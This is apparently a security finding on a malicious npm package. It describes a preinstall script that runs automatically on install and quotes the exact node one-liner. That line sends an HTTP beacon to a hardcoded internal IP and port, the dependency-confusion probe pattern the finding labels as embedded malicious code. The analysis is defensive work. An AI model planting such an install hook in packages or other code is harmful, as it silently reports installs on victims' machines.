summary: Preinstall beacon to hardcoded internal IP confirms install on victim host
details: package.json declares a preinstall lifecycle script that runs `node -e "require('http').get('http://10.107.121.85:8000/callback_node_839201')"`. On `npm install`, this fires automatically and issues an HTTP GET to a hardcoded RFC1918 IP (10.107.121.85) on port 8000 with a unique per-package callback path. The package's stated purpose is 'Probe' and there is no legitimate functionality. The beacon confirms successful installation on the target host (leaking the fact of install plus source identifiers via the TCP connection) to an endpoint reachable only from inside a specific internal network — the canonical dependency-confusion probe pattern.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
